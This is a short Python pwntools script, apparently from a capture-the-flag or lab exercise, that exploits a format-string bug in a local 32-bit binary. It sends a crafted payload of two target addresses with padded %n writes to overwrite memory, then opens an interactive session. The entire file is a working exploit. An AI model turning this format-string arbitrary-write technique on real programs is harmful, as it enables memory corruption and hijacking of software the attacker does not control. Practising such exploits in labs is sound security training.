from pwn import *

env = {'PATH' : '.:/bin:/usr/bin'}

# Launch processs
p = process('./fs-arbt-write-32', env=env)

inp = '\x48\xa0\x04\x08\x4a\xa0\x04\x08%45060x%7$n%19138x%8$n'

# Read 8 bytes
print(p.recvline())
p.sendline(inp)

p.interactive()
